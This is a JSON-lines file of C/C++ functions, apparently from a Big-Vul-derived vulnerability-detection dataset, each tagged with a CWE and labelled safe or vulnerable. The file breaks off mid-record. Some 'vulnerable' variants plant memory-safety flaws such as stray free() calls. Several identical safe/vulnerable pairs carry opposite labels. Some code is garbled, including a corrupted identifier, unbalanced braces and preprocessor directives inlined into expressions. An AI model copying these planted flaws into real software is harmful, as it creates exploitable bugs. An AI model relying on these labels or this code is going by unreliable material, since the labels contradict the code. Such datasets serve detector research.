{"idx": "CWE-862-vuln-1714408084101", "code": "ProcUngrabKeyboard(ClientPtr client){if(!client)return BadValue;DeviceIntPtr device=PickKeyboard(client);GrabPtr grab;TimeStamp time;REQUEST(xResourceReq);REQUEST_SIZE_MATCH(xResourceReq);UpdateCurrentTime();grab=device->deviceGrab.grab;time=ClientTimeToServerTime(stuff->id);if((CompareTimeStamps(time, currentTime) != LATER) && (CompareTimeStamps(time, device->deviceGrab.grabTime) != EARLIER) && (grab) && SameClient(grab, client) && grab->grabtype == CORE && !device->deviceGrab.fromPassiveGrab)(*device->deviceGrab.DeactivateGrab)(device);return Success;}", "target": 1, "source": "Big-Vul", "source_uid": "4884"}
{"idx": "CWE-119-safe-1714408097479", "code": "DisplayItems::iterator DisplayItemList::findOutOfOrderCachedItem(const DisplayItem::Id&id, OutOfOrderIndexContext&context){ASSERT(clientCacheIsValid(id.client));size_t foundIndex=findMatchingItemFromIndex(id, context.displayItemIndicesByClient, m_currentDisplayItems);if(foundIndex != kNotFound && foundIndex < m_currentDisplayItems.size())return m_currentDisplayItems.begin()+foundIndex;return findOutOfOrderCachedItemForward(id, context);}", "target": 0, "source": "Big-Vul", "source_uid": "130537"}
{"idx": "CWE-119-vuln-1714408097479", "code": "DisplayItems::iterator DisplayItemList::findOutOfOrderCachedItem(const DisplayItem::Id&id, OutOfOrderIndexContext&context){ASSERT(clientCacheIsValid(id.client));size_t foundIndex=findMatchingItemFromIndex(id, context.displayItemIndicesByClient, m_currentDisplayItems);if(foundIndex != kNotFound && foundIndex<m_currentDisplayItems.size())return m_currentDisplayItems.begin()+foundIndex;return m_currentDisplayItems.end();}", "target": 1, "source": "Big-Vul", "source_uid": "130537"}
{"idx": "CWE-20-safe-1714408105415", "code": "void ChromeDownloadManagerDelegate::OpenWithWebIntent(const DownloadItem* item){ webkit_glue::WebIntentData intent_data(ASCIIToUTF16(\"http://webintents.org/view\"), ASCIIToUTF16(item->GetMimeType()), item->GetFullPath(), item->GetReceivedBytes()); intent_data.extra_data.insert(make_pair(ASCIIToUTF16(\"url\"), ASCIIToUTF16(item->GetURL().spec()))); string16 filename = UTF8ToUTF16(item->GetSuggestedFilename()); if(filename.empty()) filename = item->GetFileNameToReportUser().LossyDisplayName(); intent_data.extra_data.insert(make_pair(ASCIIToUTF16(\"filename\"), filename)); content::WebIntentsDispatcher* dispatcher = content::WebIntentsDispatcher::Create(intent_data); item->GetWebContents()->GetDelegate()->WebIntentDispatch(item->GetWebContents(), dispatcher);}", "target": 0, "source": "Big-Vul", "source_uid": "112962"}
{"idx": "CWE-20-vuln-1714408105415", "code": "void ChromeDownloadManagerDelegate::OpenWithWebIntent(const DownloadItem* item){\n    std::string16 mimeType = ASCIIToUTF16(item->GetMimeType());\n    std::string16 fullPath = ASCIIToUTF16(item->GetFullPath());\n    std::string16 url = ASCIIToUTF16(item->GetURL().spec());\n    std::string16 suggestedFilename = UTF8ToUTF16(item->GetSuggestedFilename());\n    std::string16 filename = filename.empty() ? item->GetFileNameToReportUser().LossyDisplayName() : suggestedFilename;\n    webkit_glue::WebIntentData intent_data(url, mimeType, fullPath, item->GetReceivedBytes());\n    intent_data.extra_data.insert(make_pair(ASCIIToUTF16(\"url\"), url));\n    intent_data.extra_data.insert(make_pair(ASCIIToUTF16(\"filename\"), filename);\n    content::WebIntentsDispatcher* dispatcher = content::WebIntentsDispatcher::Create(intent_data);\n    item->GetWebContents()->GetDelegate()->WebIntentDispatch(item->GetWebContents(), dispatcher);\n}", "target": 1, "source": "Big-Vul", "source_uid": "112962"}
{"idx": "CWE-787-safe-1714408119208", "code": "GahpServer::command_version(){int i, j, result;bool ret_val=false;j=sizeof(m_gahp_version);i=0;while(i<j){if(i >= sizeof(m_gahp_version)){break;}result=buffered_read(m_gahp_readfd, &(m_gahp_version[i]), 1);if(result<0){continue;}if(result == 0){return false;}if(i == 0 && m_gahp_version[0] != '$' ){continue;}if(m_gahp_version[i] == '\\' ){continue;}if(m_gahp_version[i] == '\n' ){ret_val=true;m_gahp_version[i]='\\0';break;}i++;}return ret_val;}", "target": 0, "source": "Big-Vul", "source_uid": "16140"}
{"idx": "CWE-787-vuln-1714408119208", "code": "GahpServer::command_version(){int i, j, result;bool ret_val=false;j=sizeof(m_gahp_version);i=0;while(i<j){if(i >= sizeof(m_gahp_version)){break;}result=buffered_read(m_gahp_readfd, &(m_gahp_version[i]), 1);if(result<0){continue;}if(result == 0){return false;}if(i == 0 && m_gahp_version[0] != '$' ){continue;}if(m_gahp_version[i] == '\\'' ){continue;}if(m_gahp_version[i] == '\\n' ){ret_val=true;m_gahp_version[i]='\n';break;}i++;}if(i < sizeof(m_gahp_version)){m_gahp_version[i]='X';}return ret_val;}", "target": 1, "source": "Big-Vul", "source_uid": "16140"}
{"idx": "CWE-190-safe-1714408131423", "code": "static int ioapic_deliver(struct kvm_ioapic *ioapic, int irq) {\n    union kvm_ioapic_redirect_entry *entry = &ioapic->redirtbl[irq];\n    struct kvm_lapic_irq irqe;\n    ioapic_debug(\"dest=%x dest_mode=%x delivery_mode=%x vector=%x trig_mode=%x\\n\", entry->fields.dest_id, entry->fields.dest_mode, entry->fields.delivery_mode, entry->fields.vector, entry->fields.trig_mode);\n    irqe.dest_id = entry->fields.dest_id;\n    irqe.vector = entry->fields.vector;\n    irqe.dest_mode = entry->fields.dest_mode;\n    irqe.trig_mode = entry->fields.trig_mode;\n    irqe.delivery_mode = entry->fields.delivery_mode << 8;\n    irqe.level = 1;\n    irqe.shorthand = 0;\n    return kvm_irq_delivery_to_apic(ioapic->kvm, NULL, &irqe);\n}", "target": 0, "source": "Big-Vul", "source_uid": "33246"}
{"idx": "CWE-190-vuln-1714408131423", "code": "static int ioapic_deliver(struct kvm_ioapic *ioapic, int irq) {\n    union kvm_ioapic_redirect_entry *entry = &ioapic->redirtbl[irq];\n    struct kvm_lapic_irq irqe;\n    ioapic_debug(\"dest=%x dest_mode=%x delivery_mode=%x vector=%x trig_mode=%x\\n\", entry->fields.dest_id, entry->fields.dest_mode, entry->fields.delivery_mode, entry->fields.vector, entry->fields.trig_mode);\n    irqe.dest_id = entry->fields.dest_id;\n    irqe.vector = entry->fields.vector;\n    irqe.dest_mode = entry->fields.dest_mode;\n    irqe.trig_mode = entry->fields.trig_mode;\n    irqe.delivery_mode = entry->fields.delivery_mode << 8;\n    irqe.level = 1;\n    irqe.shorthand = 0;\n    return kvm_irq_delivery_to_apic(ioapic->kvm, NULL, &irqe);\n}", "target": 1, "source": "Big-Vul", "source_uid": "33246"}
{"idx": "CWE-416-safe-1714408146318", "code": "dissect_spoolss_buffer_data(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep){BUFFER*b=(BUFFER*)di->private_data;proto_item*item;guint32 size;const guint8*data;if(di->conformant_run)return offset;offset=dissect_ndr_uint32(tvb, offset, pinfo, tree, di, drep, hf_buffer_size, &size);offset=dissect_ndr_uint8s(tvb, offset, pinfo, NULL, di, drep, hf_buffer_data, size, &data);item=proto_tree_add_item(tree, hf_buffer_data, tvb, offset-size, size, ENC_NA);if(b){b->tvb=tvb_new_child_real_data(tvb, data, size, size);add_new_data_source(pinfo, b->tvb, \"SPOOLSS buffer\");b->item=item;b->tree=proto_item_add_subtree(item, ett_BUFFER);}return offset;}", "target": 0, "source": "Big-Vul", "source_uid": "52037"}
{"idx": "CWE-416-vuln-1714408146318", "code": "dissect_spoolss_buffer_data(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep){BUFFER*b=(BUFFER*)di->private_data;proto_item*item;guint32 size;const guint8*data;if(di->conformant_run)return offset;offset=dissect_ndr_uint32(tvb, offset, pinfo, tree, di, drep, hf_buffer_size, &size);offset=dissect_ndr_uint8s(tvb, offset, pinfo, NULL, di, drep, hf_buffer_data, size, &data);item=proto_tree_add_item(tree, hf_buffer_data, tvb, offset-size, size, ENC_NA);if(b){tvbuff_t* child_tvb = tvb_new_child_real_data(tvb, data, size, size);add_new_data_source(pinfo, child_tvb, \"SPOOLSS buffer\");b->tvb=child_tvb;b->item=item;b->tree=proto_item_add_subtree(item, ett_BUFFER);free(b);}}return offset;}", "target": 1, "source": "Big-Vul", "source_uid": "52037"}
{"idx": "CWE-416-safe-1714408159683", "code": "void Document::registerForMediaVolumeCallbacks(Element* e) { m_mediaVolumeCallbackElements.add(e); }", "target": 0, "source": "Big-Vul", "source_uid": "112527"}
{"idx": "CWE-416-vuln-1714408159683", "code": "void Document::registerForMediaVolumeCallbacks(Element*e){m_mediaVolumeCallbackElements.add(e);}", "target": 1, "source": "Big-Vul", "source_uid": "112527"}
{"idx": "CWE-416-safe-1714408167454", "code": "PlainTextRange getSelectionOffsets(LocalFrame* frame) {\n    EphemeralRange range = firstEphemeralRangeOf(frame->selection().computeVisibleSelectionInDOMTreeDeprecated());\n    if (range.isNull())\n        return PlainTextRange();\n    ContainerNode* const editable = rootEditableElementOrTreeScopeRootNodeOf(frame->selection().computeVisibleSelectionInDOMTreeDeprecated());\n    DCHECK(editable);\n    if (!editable)\n        return PlainTextRange();\n    return PlainTextRange::create(*editable, range);\n}", "target": 0, "source": "Big-Vul", "source_uid": "140397"}
{"idx": "CWE-416-vuln-1714408167454", "code": "PlainTextRange getSelectionOffsets(LocalFrame*frame){EphemeralRange range=firstEphemjsoneralRangeOf(frame->selection().computeVisibleSelectionInDOMTreeDeprecated());if(range.isNull())return PlainTextRange();ContainerNode*const editable=rootEditableElementOrTreeScopeRootNodeOf(frame->selection().computeVisibleSelectionInDOMTreeDeprecated());DCHECK(editable);if(!editable){free(editable);return PlainTextRange();}PlainTextRange result = PlainTextRange::create(*editable, range);free(editable);return result;}", "target": 1, "source": "Big-Vul", "source_uid": "140397"}
{"idx": "CWE-476-safe-1714408175503", "code": "FLAC__bool read_callback_(FLAC__byte buffer[], size_t*bytes, void*client_data){FLAC__StreamDecoder*decoder=(FLAC__StreamDecoder*)client_data;if(#if FLAC__HAS_OGG!decoder->private_->is_ogg && #endif decoder->private_->eof_callback && decoder->private_->eof_callback(decoder, decoder->private_->client_data)){*bytes=0;decoder->protected_->state=FLAC__STREAM_DECODER_END_OF_STREAM;return false;}else if(*bytes>0){if(decoder->private_->is_seeking && decoder->private_->unparseable_frame_count>20){decoder->protected_->state=FLAC__STREAM_DECODER_ABORTED;return false;}else{const FLAC__StreamDecoderReadStatus status=#if FLAC__HAS_OGG decoder->private_->is_ogg? read_callback_ogg_aspect_(decoder, buffer, bytes): #endif decoder->private_->read_callback(decoder, buffer, bytes, decoder->private_->client_data);if(status == FLAC__STREAM_DECODER_READ_STATUS_ABORT){decoder->protected_->state=FLAC__STREAM_DECODER_ABORTED;return false;}else if(*bytes == 0){if(status == FLAC__STREAM_DECODER_READ_STATUS_END_OF_STREAM || (#if FLAC__HAS_OGG!decoder->private_->is_ogg && #endif decoder->private_->eof_callback && decoder->private_->eof_callback(decoder, decoder->private_->client_data))){decoder->protected_->state=FLAC__STREAM_DECODER_END_OF_STREAM;return false;}else return true;}else return true;}}else{decoder->protected_->state=FLAC__STREAM_DECODER_ABORTED;return false;}}", "target": 0, "source": "Big-Vul", "source_uid": "174399"}
{"idx": "CWE-476-vuln-1714408175503", "code": "FLAC__bool read_callback_(FLAC__byte buffer[], size_t*bytes, void*client_data){FLAC__StreamDecoder*decoder=(FLAC__StreamDecoder*)client_data;if(decoder && #if FLAC__HAS_OGG!decoder->private_->is_ogg && decoder->private_ && decoder->private_->eof_callback && decoder->private_->eof_callback(decoder, decoder->private_->client_data)){*bytes=0;decoder->protected_->state=FLAC__STREAM_DECODER_END_OF_STREAM;return false;}else if(*bytes>0){if(decoder->private_ && decoder->private_->is_seeking && decoder->private_->unparseable_frame_count>20){decoder->protected_->state=FLAC__STREAM_DECODER_ABORTED;return false;}else{const FLAC__StreamDecoderReadStatus status=#if FLAC__HAS_OGG decoder->private_ && decoder->private_->is_ogg? read_callback_ogg_aspect_(decoder, buffer, bytes): #endif decoder->private_ && decoder->private_->read_callback(decoder, buffer, bytes, decoder->private_->client_data);if(status == FLAC__STREAM_DECODER_READ_STATUS_ABORT){decoder->protected_->state=FLAC__STREAM_DECODER_ABORTED;return false;}else if(*bytes == 0){if(status == FLAC__STREAM_DECODER_READ_STATUS_END_OF_STREAM || (decoder && #if FLAC__HAS_OGG!decoder->private_->is_ogg && decoder->private_ && decoder->private_->eof_callback && decoder->private_->eof_callback(decoder, decoder->private_->client_data))){decoder->protected_->state=FLAC__STREAM_DECODER_END_OF_STREAM;return false;}else return true;}else return true;}}else{decoder->protected_->state=FLAC__STREAM_DECODER_ABORTED;return false;}}", "target": 1, "source": "Big-Vul", "source_uid": "174399"}
{"idx": "CWE-20-safe-1714408190255", "code": "spdy::SettingsMap GetHttp2Settings(const VariationParameters& http2_trial_params) {\n    spdy::SettingsMap http2_settings;\n    const std::string settings_string = GetVariationParam(http2_trial_params, \"http2_settings\");\n    base::StringPairs key_value_pairs;\n    if (!base::SplitStringIntoKeyValuePairs(settings_string, ':', ', ', &key_value_pairs)) {\n        return http2_settings;\n    }\n    for (auto key_value : key_value_pairs) {\n        uint32_t key;\n        if (!base::StringToUint(key_value.first, &key))\n            continue;\n        uint32_t value;\n        if (!base::StringToUint(key_value.second, &value))\n            continue;\n        if (key <= std::numeric_limits<uint32_t>::max()) {\n            http2_settings[static_cast<spdy::SpdyKnownSettingsId>(key)] = value;\n        }\n    }\n    return http2_settings;\n}", "target": 0, "source": "Big-Vul", "source_uid": "165728"}
{"idx": "CWE-20-vuln-1714408190255", "code": "spdy::SettingsMap GetHttp2Settings(const VariationParameters& http2_trial_params) {\n    spdy::SettingsMap http2_settings;\n    const std::string settings_string = GetVariationParam(http2_trial_params, \"http2_settings\");\n    base::StringPairs key_value_pairs;\n    if (!base::SplitStringIntoKeyValuePairs(settings_string, ':', ', ', &key_value_pairs)) {\n        return http2_settings;\n    }\n    for (auto key_value : key_value_pairs) {\n        uint32_t key;\n        if (!base::StringToUint(key_value.first, &key))\n            continue;\n        uint32_t value;\n        if (!base::StringToUint(key_value.second, &value))\n            continue;\n        if (key <= std::numeric_limits<uint32_t>::max() && key >= std::numeric_limits<uint32_t>::min()) {\n            http2_settings[static_cast<spdy::SpdyKnownSettingsId>(key)] = value;\n        }\n    }\n    return http2_settings;\n}", "target": 1, "source": "Big-Vul", "source_uid": "165728"}
{"idx": "CWE-476-safe-1714408204703", "code": "static int qib_file_vma_fault(struct vm_area_struct*vma, struct vm_fault*vmf){struct page*page;page=vmalloc_to_page((void*)(vmf->pgoff<<PAGE_SHIFT));if(!page||!vmf)return VM_FAULT_SIGBUS;get_page(page);vmf->page=page;return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "52937"}
{"idx": "CWE-476-vuln-1714408204703", "code": "static int qib_file_vma_fault(struct vm_area_struct*vma, struct vm_fault*vmf){struct page*page;page=vmalloc_to_page((void*)(vmf->pgoff<<PAGE_SHIFT));if(!vmf)return VM_FAULT_SIGBUS;if(!page)return VM_FAULT_SIGBUS;get_page(page);vmf->page=page;return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "52937"}
{"idx": "CWE-476-safe-1714408214497", "code": "static int set_dac_range(struct task_struct*child, struct ppc_hw_breakpoint*bp_info){if (!bp_info) return -EINVAL;int mode=bp_info->addr_mode&PPC_BREAKPOINT_MODE_MASK;if(bp_info->condition_mode)return-EINVAL;if(bp_info->addr >= TASK_SIZE)return-EIO;if(mode == PPC_BREAKPOINT_MODE_MASK){if(~((unsigned long)bp_info->addr2) >= TASK_SIZE)return-EIO;}else{if(bp_info->addr2 >= TASK_SIZE)return-EIO;}if(child->thread.dbcr0&(DBCR0_DAC1R|DBCR0_DAC1W|DBCR0_DAC2R|DBCR0_DAC2W))return-ENOSPC;if(bp_info->trigger_type&PPC_BREAKPOINT_TRIGGER_READ)child->thread.dbcr0|=(DBCR0_DAC1R|DBCR0_IDM);if(bp_info->trigger_type&PPC_BREAKPOINT_TRIGGER_WRITE)child->thread.dbcr0|=(DBCR0_DAC1W|DBCR0_IDM);child->thread.dac1=bp_info->addr;child->thread.dac2=bp_info->addr2;if(mode == PPC_BREAKPOINT_MODE_RANGE_INCLUSIVE)child->thread.dbcr2|=DBCR2_DAC12M;else if(mode == PPC_BREAKPOINT_MODE_RANGE_EXCLUSIVE)child->thread.dbcr2|=DBCR2_DAC12MX;else child->thread.dbcr2|=DBCR2_DAC12MM;child->thread.regs->msr|=MSR_DE;return 5;}", "target": 0, "source": "Big-Vul", "source_uid": "25491"}
{"idx": "CWE-476-vuln-1714408214497", "code": "static int set_dac_range(struct task_struct*child, struct ppc_hw_breakpoint*bp_info){if(!bp_info||!child)return-EINVAL;int mode=bp_info->addr_mode&PPC_BREAKPOINT_MODE_MASK;if(bp_info->condition_mode)return-EINVAL;if(bp_info->addr >= TASK_SIZE)return-EIO;if(mode == PPC_BREAKPOINT_MODE_MASK){if(~((unsigned long)bp_info->addr2) >= TASK_SIZE)return-EIO;}else{if(bp_info->addr2 >= TASK_SIZE)return-EIO;}if(child->thread.dbcr0&(DBCR0_DAC1R|DBCR0_DAC1W|DBCR0_DAC2R|DBCR0_DAC2W))return-ENOSPC;if(bp_info->trigger_type&PPC_BREAKPOINT_TRIGGER_READ)child->thread.dbcr0|=(DBCR0_DAC1R|DBCR0_IDM);if(bp_info->trigger_type&PPC_BREAKPOINT_TRIGGER_WRITE)child->thread.dbcr0|=(DBCR0_DAC1W|DBCR0_IDM);child->thread.dac1=bp_info->addr;child->thread.dac2=bp_info->addr2;if(mode == PPC_BREAKPOINT_MODE_RANGE_INCLUSIVE)child->thread.dbcr2|=DBCR2_DAC12M;else if(mode == PPC_BREAKPOINT_MODE_RANGE_EXCLUSIVE)child->thread.dbcr2|=DBCR2_DAC12MX;else child->thread.dbcr2|=DBCR2_DAC12MM;child->thread.regs->msr|=MSR_DE;return 5;}", "target": 1, "source": "Big-Vul", "source_uid": "25491"}
{"idx": "CWE-20-safe-1714408235640", "code": "int ExtensionDevToolsInfoBarDelegate::GetButtons() const { return BUTTON_CANCEL; }", "target": 0, "source": "Big-Vul", "source_uid": "116490"}
{"idx": "CWE-20-vuln-1714408235640", "code": "int ExtensionDevToolsInfoBarDelegate::GetButtons()const{return BUTTON_CANCEL;}", "target": 1, "source": "Big-Vul", "source_uid": "116490"}
{"idx": "CWE-1341-safe-1714408248441", "code": "void ServiceWorkerContextCore::RegisterProviderHostByClientID(const std::string& client_uuid, ServiceWorkerProviderHost* provider_host) {\n    if (!ContainsKey(*provider_by_uuid_, client_uuid)) {\n        (*provider_by_uuid_)[client_uuid] = provider_host;\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "152160"}
{"idx": "CWE-1341-vuln-1714408248441", "code": "void ServiceWorkerContextCore::RegisterProviderHostByClientID(const std::string&client_uuid, ServiceWorkerProviderHost*provider_host){if(!ContainsKey(*provider_by_uuid_, client_uuid)){(*provider_by_uuid_)[client_uuid]=provider_host; erase(*provider_by_uuid_, client_uuid);}}", "target": 1, "source": "Big-Vul", "source_uid": "152160"}
{"idx": "CWE-20-safe-1714408260447", "code": "void RenderFrameImpl::DidReceiveTitle(const blink::WebString& title, blink::WebTextDirection direction) {\n    if (!frame_->Parent()) {\n        base::trace_event::TraceLog::GetInstance()->UpdateProcessLabel(routing_id_, title.Utf8());\n        base::string16 title16 = title.Utf16();\n        base::string16 shortened_title = title16.substr(0, std::min(title16.length(), static_cast<size_t>(kMaxTitleChars)));\n        Send(new FrameHostMsg_UpdateTitle(routing_id_, shortened_title, direction));\n    } else {\n        GURL loading_url = GetLoadingUrl();\n        if (!loading_url.host().empty() && loading_url.scheme() != url::kFileScheme) {\n            std::string subframe_title = \"Subframe: \" + loading_url.scheme() + url::kStandardSchemeSeparator + loading_url.host();\n            base::trace_event::TraceLog::GetInstance()->UpdateProcessLabel(routing_id_, subframe_title);\n        }\n    }\n    UpdateEncoding(frame_, frame_->View()->PageEncoding().Utf8());\n}", "target": 0, "source": "Big-Vul", "source_uid": "152287"}
{"idx": "CWE-20-vuln-1714408260447", "code": "void RenderFrameImpl::DidReceiveTitle(const blink::WebString&title, blink::WebTextDirection direction){if(!frame_->Parent()){base::trace_event::TraceLog::GetInstance()->UpdateProcessLabel(routing_id_, title.Utf8());base::string16 title16=title.Utf16();base::string16 shortened_title=title16.substr(0, std::min(title16.length(), static_cast<size_t>(kMaxTitleChars)));Send(new FrameHostMsg_UpdateTitle(routing_id_, shortened_title, direction));}else{GURL loading_url=GetLoadingUrl();if(!loading_url.host().empty() && loading_url.scheme() != url::kFileScheme){std::string subframe_title=\"Subframe: \"+loading_url.scheme()+url::kStandardSchemeSeparator+loading_url.host();base::trace_event::TraceLog::GetInstance()->UpdateProcessLabel(routing_id_, subframe_title);}}UpdateEncoding(frame_, frame_->View()->PageEncoding().Utf8());}", "target": 1, "source": "Big-Vul", "source_uid": "152287"}
{"idx": "CWE-476-safe-1714408274369", "code": "unsigned int iucv_sock_poll(struct file* file, struct socket* sock, poll_table* wait){if (!file || !sock || !wait) return 0;struct sock* sk = sock->sk;unsigned int mask = 0;sock_poll_wait(file, sk_sleep(sk), wait);if(sk && sk->sk_state == IUCV_LISTEN)return iucv_accept_poll(sk);if(sk && (sk->sk_err || !skb_queue_empty(&sk->sk_error_queue)))mask |= POLLERR;if(sk && (sk->sk_shutdown & RCV_SHUTDOWN))mask |= POLLRDHUP;if(sk && sk->sk_shutdown == SHUTDOWN_MASK)mask |= POLLHUP;if(sk && (!skb_queue_empty(&sk->sk_receive_queue) || (sk->sk_shutdown & RCV_SHUTDOWN)))mask |= POLLIN | POLLRDNORM;if(sk && sk->sk_state == IUCV_CLOSED)mask |= POLLHUP;if(sk && sk->sk_state == IUCV_DISCONN)mask |= POLLIN;if(sk && sock_writeable(sk) && iucv_below_msglim(sk))mask |= POLLOUT | POLLWRNORM | POLLWRBAND;else set_bit(SOCK_ASYNC_NOSPACE, &sk->sk_socket->flags);return mask;}", "target": 0, "source": "Big-Vul", "source_uid": "30624"}
{"idx": "CWE-476-vuln-1714408274369", "code": "unsigned int iucv_sock_poll(struct file*file, struct socket*sock, poll_table*wait){if(!file || !sock || !wait)return 0;struct sock*sk=sock->sk;unsigned int mask=0;sock_poll_wait(file, sk_sleep(sk), wait);if(sk && sk->sk_state == IUCV_LISTEN)return iucv_accept_poll(sk);if(sk && (sk->sk_err || !skb_queue_empty(&sk->sk_error_queue)))mask|=POLLERR;if(sk && (sk->sk_shutdown&RCV_SHUTDOWN))mask|=POLLRDHUP;if(sk && sk->sk_shutdown == SHUTDOWN_MASK)mask|=POLLHUP;if(sk && (!skb_queue_empty(&sk->sk_receive_queue) || (sk->sk_shutdown&RCV_SHUTDOWN)))mask|=POLLIN|POLLRDNORM;if(sk && sk->sk_state == IUCV_CLOSED)mask|=POLLHUP;if(sk && sk->sk_state == IUCV_DISCONN)mask|=POLLIN;if(sk && sock_writeable(sk) && iucv_below_msglim(sk))mask|=POLLOUT|POLLWRNORM|POLLWRBAND;else if(sk && sk->sk_socket) set_bit(SOCK_ASYNC_NOSPACE, &sk->sk_socket->flags);return mask;}", "target": 1, "source": "Big-Vul", "source_uid": "30624"}
{"idx": "CWE-190-safe-1714408289631", "code": "static inline void ModulateHCL(const double percent_hue, const double percent_chroma, const double percent_luma, double* red, double* green, double* blue){ double hue, luma, chroma; ConvertRGBToHCL(*red, *green, *blue, &hue, &chroma, &luma); hue += fmod((percent_hue - 100.0), 200.0) / 200.0; chroma *= 0.01 * percent_chroma; luma *= 0.01 * percent_luma; ConvertHCLToRGB(hue, chroma, luma, red, green, blue);}", "target": 0, "source": "Big-Vul", "source_uid": "62632"}
{"idx": "CWE-190-vuln-1714408289631", "code": "static inline void ModulateHCL(const double percent_hue, const double percent_chroma, const double percent_luma, double* red, double* green, double* blue){ double hue, luma, chroma; ConvertRGBToHCL(*red, *green, *blue, &hue, &chroma, &luma); hue += fmod((percent_hue - 100.0), 200.0) / 200.0; chroma *= 0.01 * percent_chroma; luma *= 0.01 * percent_luma; ConvertHCLToRGB(hue, chroma, luma, red, green, blue);}", "target": 1, "source": "Big-Vul", "source_uid": "62632"}
{"idx": "CWE-20-safe-1714408301448", "code": "static void populateResourceTiming(ResourceTimingInfo*info, Resource*resource, bool clearLoadTimings){if(info && resource){info->setInitialRequest(resource->resourceRequest());info->setFinalResponse(resource->response());if(clearLoadTimings){info->clearLoadTimings();info->setLoadFinishTime(info->initialTime());}else{info->setLoadFinishTime(resource->loadFinishTime());}}}", "target": 0, "source": "Big-Vul", "source_uid": "129723"}
{"idx": "CWE-20-vuln-1714408301448", "code": "static void populateResourceTiming(ResourceTimingInfo*info, Resource*resource, bool clearLoadTimings){if(info && resource){info->setInitialRequest(resource->resourceRequest());info->setFinalResponse(resource->response());if(clearLoadTimings){info->clearLoadTimings();if(resource){info->setLoadFinishTime(info->initialTime());}}else{info->setLoadFinishTime(resource->loadFinishTime());}}}", "target": 1, "source": "Big-Vul", "source_uid": "129723"}
{"idx": "CWE-416-safe-1714408311484", "code": "megasas_get_seq_num(struct megasas_instance*instance, struct megasas_evt_log_info*eli){struct megasas_cmd*cmd;struct megasas_dcmd_frame*dcmd;struct megasas_evt_log_info*el_info;dma_addr_t el_info_h=0;int ret;cmd=megasas_get_cmd(instance);if(!cmd){return-ENOMEM;}if(!instance->pdev){megasas_return_cmd(instance, cmd);return-ENOMEM;}dcmd=&cmd->frame->dcmd;el_info=dma_zalloc_coherent(&instance->pdev->dev, sizeof(struct megasas_evt_log_info), &el_info_h, GFP_KERNEL);if(!el_info){megasas_return_cmd(instance, cmd);return-ENOMEM;}memset(dcmd->mbox.b, 0, MFI_MBOX_SIZE);dcmd->cmd=MFI_CMD_DCMD;dcmd->cmd_status=0x0;dcmd->sge_count=1;dcmd->flags=MFI_FRAME_DIR_READ;dcmd->timeout=0;dcmd->pad_0=0;dcmd->data_xfer_len=cpu_to_le32(sizeof(struct megasas_evt_log_info));dcmd->opcode=cpu_to_le32(MR_DCMD_CTRL_EVENT_GET_INFO);megasas_set_dma_settings(instance, dcmd, el_info_h, sizeof(struct megasas_evt_log_info));ret=megasas_issue_blocked_cmd(instance, cmd, MFI_IO_TIMEOUT_SECS);if(ret != DCMD_SUCCESS){dev_err(&instance->pdev->dev, \"Failed from%s%d\\n\", __func__, __LINE__);goto dcmd_failed;}eli->newest_seq_num=el_info->newest_seq_num;eli->oldest_seq_num=el_info->oldest_seq_num;eli->clear_seq_num=el_info->clear_seq_num;eli->shutdown_seq_num=el_info->shutdown_seq_num;eli->boot_seq_num=el_info->boot_seq_num;dcmd_failed: dma_free_coherent(&instance->pdev->dev, sizeof(struct megasas_evt_log_info), el_info, el_info_h);megasas_return_cmd(instance, cmd);return ret;}", "target": 0, "source": "Big-Vul", "source_uid": "90358"}
{"idx": "CWE-416-vuln-1714408311484", "code": "megasas_get_seq_num(struct megasas_instance*instance, struct megasas_evt_log_info*eli){struct megasas_cmd*cmd;struct megasas_dcmd_frame*dcmd;struct megasas_evt_log_info*el_info;dma_addr_t el_info_h=0;int ret;cmd=megasas_get_cmd(instance);if(!cmd){return-ENOMEM;}if(!instance->pdev){megasas_return_cmd(instance, cmd);return-ENOMEM;}dcmd=&cmd->frame->dcmd;el_info=dma_zalloc_coherent(&instance->pdev->dev, sizeof(struct megasas_evt_log_info), &el_info_h, GFP_KERNEL);if(!el_info){megasas_return_cmd(instance, cmd);return-ENOMEM;}memset(dcmd->mbox.b, 0, MFI_MBOX_SIZE);dcmd->cmd=MFI_CMD_DCMD;dcmd->cmd_status=0x0;dcmd->sge_count=1;dcmd->flags=MFI_FRAME_DIR_READ;dcmd->timeout=0;dcmd->pad_0=0;dcmd->data_xfer_len=cpu_to_le32(sizeof(struct megasas_evt_log_info));dcmd->opcode=cpu_to_le32(MR_DCMD_CTRL_EVENT_GET_INFO);megasas_set_dma_settings(instance, dcmd, el_info_h, sizeof(struct megasas_evt_log_info));ret=megasas_issue_blocked_cmd(instance, cmd, MFI_IO_TIMEOUT_SECS);if(ret != DCMD_SUCCESS){dev_err(&instance->pdev->dev, \"Failed from%s%d\\n\", __func__, __LINE__);goto dcmd_failed;}eli->newest_seq_num=el_info->newest_seq_num;eli->oldest_seq_num=el_info->oldest_seq_num;eli->clear_seq_num=el_info->clear_seq_num;eli->shutdown_seq_num=el_info->shutdown_seq_num;eli->boot_seq_num=el_info->boot_seq_num;dcmd_failed: dma_free_coherent(&instance->pdev->dev, sizeof(struct megasas_evt_log_info), el_info, el_info_h);el_info=NULL;megasas_return_cmd(instance, cmd);return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "90358"}
{"idx": "CWE-119-safe-1714408336501", "code": "Eina_Bool ewk_view_pre_render_region(Evas_Object*ewkView, Evas_Coord x, Evas_Coord y, Evas_Coord width, Evas_Coord height, float zoom){EWK_VIEW_SD_GET_OR_RETURN(ewkView, smartData, false);EWK_VIEW_PRIV_GET_OR_RETURN(smartData, priv, false);EINA_SAFETY_ON_NULL_RETURN_VAL(smartData->api->pre_render_region, false);float cur_zoom;Evas_Coord contentsWidth, contentsHeight;if(priv->animatedZoom.animator)return false;cur_zoom=ewk_frame_page_zoom_get(smartData->main_frame);if(cur_zoom<0.00001)return false;if(!ewk_frame_contents_size_get(smartData->main_frame, &contentsWidth, &contentsHeight))return false;contentsWidth*=zoom/cur_zoom;contentsHeight*=zoom/cur_zoom;DBG(\"region%d, %d+%dx%d @%f contents=%dx%d\", x, y, width, height, zoom, contentsWidth, contentsHeight);if(x+width>contentsWidth || width < 0) width=contentsWidth-x; if(y+height>contentsHeight || height < 0) height=contentsHeight-y; 